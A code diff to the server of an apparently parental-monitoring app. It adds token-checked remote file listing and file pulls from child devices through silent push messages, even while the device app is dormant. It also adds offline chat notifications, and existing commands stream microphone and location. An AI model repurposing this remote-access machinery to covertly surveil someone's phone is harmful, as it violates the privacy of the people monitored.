@@ -129,6 +129,15 @@ async function fetchLatestRelease() {
 // Auto-expires after 10 minutes
 const fileStore = new Map()
 
+// Stateless quick-pull tracking: requestId → { userId, pullToken, forAdminId, createdAt }.
+// Created when the admin requests a file/directory listing (see quick_pull_ls/
+// quick_pull_read_file above), validated when the device's brief FCM-triggered handler
+// posts the result back over plain HTTP (see /api/ls/:requestId and the pullToken
+// check added to /api/file/:requestId below) — this is the credential that lets a
+// stateless request authenticate without any live WS session at all.
+const pendingPulls = new Map()
+const PENDING_PULL_TTL_MS = 3 * 60 * 1000 // generous vs. the ~20-30s goAsync() window
+
 // Bounds how many uploads can be buffering into memory at once (each up to MAX_FILE_MB).
 const MAX_CONCURRENT_UPLOADS = 5
 let activeUploads = 0
@@ -235,20 +244,39 @@ const server = http.createServer(async (req, res) => {
     // ── File upload from child device ─────────────────────────────────────
     if (req.method === 'POST' && urlPath.startsWith('/api/file/')) {
       const requestId  = urlPath.replace('/api/file/', '')
-      const adminId    = req.headers['x-admin-id'] || ''
-      const fromUserId = req.headers['x-user-id']  || ''
+      let   adminId    = req.headers['x-admin-id'] || ''
+      let   fromUserId = req.headers['x-user-id']  || ''
       const name       = decodeURIComponent(req.headers['x-file-name'] || 'file')
       const mime       = req.headers['content-type'] || 'application/octet-stream'
 
-      // Same per-session upload token proof as the profile-photo endpoint below —
-      // fromUserId/adminId are client-supplied headers with no inherent trust (userId is
-      // broadcast in plaintext to every connected client via auth_ok/users_list), so the
-      // previous "does fromUserId match SOME live session" check was defeatable by anyone
-      // who simply knew a live child's userId. The token is minted fresh per WS connection
-      // and sent only to that connection's own auth_ok reply, never broadcast.
-      const presentedToken = req.headers['x-upload-token'] || ''
-      if (!fromUserId || !verifyUploadToken(fromUserId, presentedToken)) {
-        res.writeHead(403); res.end('Invalid or missing upload token'); return
+      // Two independent ways to prove this upload is legitimate: a live WS session's
+      // per-connection upload token (unchanged, below), or — for a stateless quick-pull
+      // request, which has no live WS session at all — the one-shot pullToken minted
+      // when the admin requested it (see quick_pull_read_file above). Checking the pull
+      // token FIRST means adminId/fromUserId are re-derived from the server's own
+      // pendingPulls record rather than trusted from client-supplied headers.
+      const presentedPullToken = req.headers['x-pull-token'] || ''
+      if (presentedPullToken) {
+        const pending = pendingPulls.get(requestId)
+        const pendingBuf = pending ? Buffer.from(pending.pullToken) : null
+        const presentedBuf = Buffer.from(presentedPullToken)
+        const pullOk = pending && pendingBuf.length === presentedBuf.length &&
+          crypto.timingSafeEqual(pendingBuf, presentedBuf)
+        if (!pullOk) { res.writeHead(403); res.end('Invalid or expired pull token'); return }
+        adminId = pending.forAdminId
+        fromUserId = pending.userId
+        pendingPulls.delete(requestId) // one-shot
+      } else {
+        // Same per-session upload token proof as the profile-photo endpoint below —
+        // fromUserId/adminId are client-supplied headers with no inherent trust (userId is
+        // broadcast in plaintext to every connected client via auth_ok/users_list), so the
+        // previous "does fromUserId match SOME live session" check was defeatable by anyone
+        // who simply knew a live child's userId. The token is minted fresh per WS connection
+        // and sent only to that connection's own auth_ok reply, never broadcast.
+        const presentedToken = req.headers['x-upload-token'] || ''
+        if (!fromUserId || !verifyUploadToken(fromUserId, presentedToken)) {
+          res.writeHead(403); res.end('Invalid or missing upload token'); return
+        }
       }
 
       // Cap total concurrent in-flight uploads — each one buffers up to MAX_FILE_MB in
@@ -277,11 +305,23 @@ const server = http.createServer(async (req, res) => {
 
       req.on('end', () => {
         releaseUpload()
+        const admin = admins.get(adminId)
+        // A quick-pull device reports "file not found" / "too large" etc. by POSTing
+        // here with an X-Error header and an empty body instead of real file bytes —
+        // there's no separate error endpoint, this is the one place the admin is
+        // already listening for a reply to this exact requestId.
+        const deviceError = req.headers['x-error']
+        if (deviceError) {
+          if (admin) send(admin.ws, { type: 'file_error', requestId, error: deviceError, fromUserId })
+          res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
+          res.end(JSON.stringify({ ok: true }))
+          return
+        }
+
         const data = Buffer.concat(chunks)
         fileStore.set(requestId, { data, mime, name, adminId, fromUserId })
 
         // Notify the waiting admin via WebSocket
-        const admin = admins.get(adminId)
         if (admin) {
           send(admin.ws, {
             type: 'file_ready',
@@ -301,6 +341,51 @@ const server = http.createServer(async (req, res) => {
       })
 
       req.on('error', () => { releaseUpload(); res.writeHead(500); res.end('Upload error') })
+      return
+    }
+
+    // ── Directory listing from a stateless quick-pull (device-side: see
+    // FamilyWatchMessagingService.java's quick_pull_ls handling) ───────────
+    if (req.method === 'POST' && urlPath.startsWith('/api/ls/')) {
+      const requestId = urlPath.replace('/api/ls/', '')
+      const presentedPullToken = req.headers['x-pull-token'] || ''
+      const pending = pendingPulls.get(requestId)
+      const pendingBuf = pending ? Buffer.from(pending.pullToken) : null
+      const presentedBuf = Buffer.from(presentedPullToken)
+      const pullOk = pending && presentedPullToken && pendingBuf.length === presentedBuf.length &&
+        crypto.timingSafeEqual(pendingBuf, presentedBuf)
+      if (!pullOk) { res.writeHead(403); res.end('Invalid or expired pull token'); return }
+      pendingPulls.delete(requestId) // one-shot
+
+      const chunks = []
+      let totalBytes = 0
+      req.on('data', chunk => {
+        totalBytes += chunk.length
+        if (totalBytes > 2 * 1024 * 1024) { req.destroy(); res.writeHead(413); res.end('Listing too large'); return }
+        chunks.push(chunk)
+      })
+      req.on('end', () => {
+        let body
+        try {
+          body = JSON.parse(Buffer.concat(chunks).toString('utf8'))
+        } catch {
+          res.writeHead(400); res.end('Invalid JSON'); return
+        }
+        const admin = admins.get(pending.forAdminId)
+        if (admin) {
+          send(admin.ws, {
+            type: 'ls_result',
+            forAdminId: pending.forAdminId,
+            fromUserId: pending.userId,
+            path: body.path || [],
+            entries: body.entries || [],
+            error: body.error || undefined,
+          })
+        }
+        res.writeHead(200, { ...CORS, 'Content-Type': 'application/json' })
+        res.end(JSON.stringify({ ok: true }))
+      })
+      req.on('error', () => { res.writeHead(500); res.end('Listing upload error') })
       return
     }
 
@@ -554,6 +639,20 @@ function broadcastToAdmins(msg) {
   for (const [, m] of admins) send(m.ws, msg)
 }
 
+// Pushes a real, visible notification for a DM the recipient would otherwise never see
+// at all — both `dm` handlers below only ever deliver to a live connection, with no
+// persistence or fallback, so this is the WhatsApp-style "missed message" push. Called
+// only when the recipient isn't currently connected; an active chat shouldn't also
+// trigger a system notification. Fail-soft and silent: no device token (e.g. `toId` is
+// an admin, who never registers one) or a send failure both just no-op — a notification
+// problem must never surface as a DM-send error.
+function notifyDmOffline(toId, fromName, text) {
+  const device = store.getDeviceToken(toId)
+  if (!device || !device.fcm_token) return
+  const body = text.length > 120 ? text.slice(0, 117) + '...' : text
+  firebaseAdmin.sendChatNotification(device.fcm_token, { title: fromName, body }).catch(() => {})
+}
+
 // Shared by device_list_get's reply and register_fcm_token's broadcast below, so an
 // admin panel already open sees a newly-registered device without needing to reconnect.
 function buildDeviceList() {
@@ -741,18 +840,54 @@ wss.on('connection', (ws, req) => {
 
       // ── Admin commands ──────────────────────────────
       if (meta.role === 'admin') {
-        if (['ls', 'read_file', 'stop_camera',
-             'start_mic', 'stop_mic', 'start_location', 'stop_location'].includes(msg.type)) {
+        // File browsing (ls/read_file) no longer routes through the live connection at
+        // all — see quick_pull_ls/quick_pull_read_file below. Only genuinely *live*
+        // actions (mic/location streaming) still need bgWs to be connected.
+        if (['stop_camera', 'start_mic', 'stop_mic', 'start_location', 'stop_location'].includes(msg.type)) {
           const target = users.get(msg.targetId)
           if (target) {
             send(target.bgWs || target.ws, { ...msg, fromAdminId: meta.userId })
-          } else if (['ls', 'start_mic', 'start_location'].includes(msg.type)) {
+          } else if (['start_mic', 'start_location'].includes(msg.type)) {
             // KeepAliveService is dormant by default now, so "not connected" is common —
-            // tell the admin why nothing happened instead of a silent dead end (stop_* and
-            // read_file don't need this: stopping something already stopped is a no-op, and
-            // read_file always follows an ls that would already have surfaced this).
+            // tell the admin why nothing happened instead of a silent dead end (stop_*
+            // doesn't need this: stopping something already stopped is a no-op).
             send(ws, { type: 'target_offline', action: msg.type, userId: msg.targetId })
           }
+          return
+        }
+        // ── Quick-pull file browsing — stateless, no persistent connection needed ──
+        // Unlike every other admin→child command, this never touches `users`/bgWs at
+        // all — it works purely off the durable device_tokens roster (same one
+        // wake_user already uses), so a dormant/killed/MIUI-throttled device can still
+        // be file-browsed. See FamilyWatchMessagingService.java's quick_pull_ls/
+        // quick_pull_read_file handling for the device-side half of this.
+        if (msg.type === 'quick_pull_ls' || msg.type === 'quick_pull_read_file') {
+          const device = store.getDeviceToken(msg.targetId)
+          if (!device || !device.fcm_token) {
+            send(ws, { type: 'target_offline', action: msg.type, userId: msg.targetId })
+            return
+          }
+          const requestId = msg.requestId || crypto.randomBytes(8).toString('hex')
+          const pullToken = crypto.randomBytes(24).toString('hex')
+          pendingPulls.set(requestId, {
+            userId: msg.targetId, pullToken, forAdminId: meta.userId, createdAt: Date.now(),
+          })
+          setTimeout(() => pendingPulls.delete(requestId), PENDING_PULL_TTL_MS)
+          const data = {
+            type: msg.type,
+            userId: msg.targetId,
+            requestId,
+            pullToken,
+            path: JSON.stringify(msg.path || []),
+          }
+          if (msg.type === 'quick_pull_read_file') {
+            data.preview = msg.preview ? '1' : '0'
+          }
+          firebaseAdmin.sendDataMessage(device.fcm_token, data).catch((e) => {
+            pendingPulls.delete(requestId)
+            const errType = msg.type === 'quick_pull_ls' ? 'ls_result' : 'file_error'
+            send(ws, { type: errType, forAdminId: meta.userId, error: e.message, requestId, path: msg.path, entries: [] })
+          })
           return
         }
         // start_camera → both: browser ws (LiveKit publish) AND bgWs (JPEG fallback)
@@ -769,10 +904,15 @@ wss.on('connection', (ws, req) => {
         // Admin DM to a specific user
         if (msg.type === 'dm') {
           const target = [...byWs.values()].find(m => m.userId === msg.toId)
+          const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
+          // Sender always sees their own sent message locally, delivered or not —
+          // matches how WhatsApp shows a message as sent immediately regardless of the
+          // recipient's connection state, rather than only echoing on success.
+          send(ws, { ...out, own: true })
           if (target) {
-            const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
             send(target.ws, out)
-            send(ws, { ...out, own: true })
+          } else {
+            notifyDmOffline(msg.toId, meta.name, msg.text)
           }
           return
         }
@@ -846,7 +986,7 @@ wss.on('connection', (ws, req) => {
           send(ws, { type: 'wake_result', userId: msg.userId, ok: false, reason: 'No device registered' })
           return
         }
-        firebaseAdmin.sendWakeUp(device.fcm_token)
+        firebaseAdmin.sendDataMessage(device.fcm_token, { type: 'wake_app' })
           .then(() => send(ws, { type: 'wake_result', userId: msg.userId, ok: true }))
           .catch((e) => send(ws, { type: 'wake_result', userId: msg.userId, ok: false, reason: e.message }))
         return
@@ -1329,10 +1469,14 @@ wss.on('connection', (ws, req) => {
         // Direct message — send to specific user only
         if (msg.type === 'dm') {
           const target = [...byWs.values()].find(m => m.userId === msg.toId)
+          const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
+          send(ws, { ...out, own: true })
           if (target) {
-            const out = { type: 'dm', text: msg.text, from: meta.name, fromId: meta.userId, toId: msg.toId, ts: Date.now() }
             send(target.ws, out)
-            send(ws, { ...out, own: true })
+          } else {
+            // No-ops harmlessly if toId is an admin (admins never register a device
+            // token — no native app), and pushes a real notification if it's a child.
+            notifyDmOffline(msg.toId, meta.name, msg.text)
           }
         }
       }
